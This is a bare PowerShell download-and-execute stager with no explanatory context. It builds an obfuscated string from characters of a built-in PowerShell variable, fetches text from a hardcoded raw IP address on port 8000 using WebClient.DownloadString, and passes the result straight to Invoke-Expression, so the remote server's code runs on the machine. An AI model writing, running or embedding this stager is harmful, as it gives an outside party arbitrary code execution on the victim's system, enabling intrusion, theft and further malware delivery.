$ps = ($PSSessionConfigurationName[3]+$PSSessionConfigurationName[19]+$PSSessionConfigurationName[31]+$PSSessionConfigurationName[10]+$PSSessionConfigurationName[18]+$PSSessionConfigurationName[7]+$PSSessionConfigurationName[0]+$PSSessionConfigurationName[10]+$PSSessionConfigurationName[37]+$PSSessionConfigurationName[37])
$uid = "A1b2C3"
$u = "http://185.205.187.109:8000/" + $uid
$c = (New-Object System.Net.WebClient).DownloadString($u)
Invoke-Expression $c

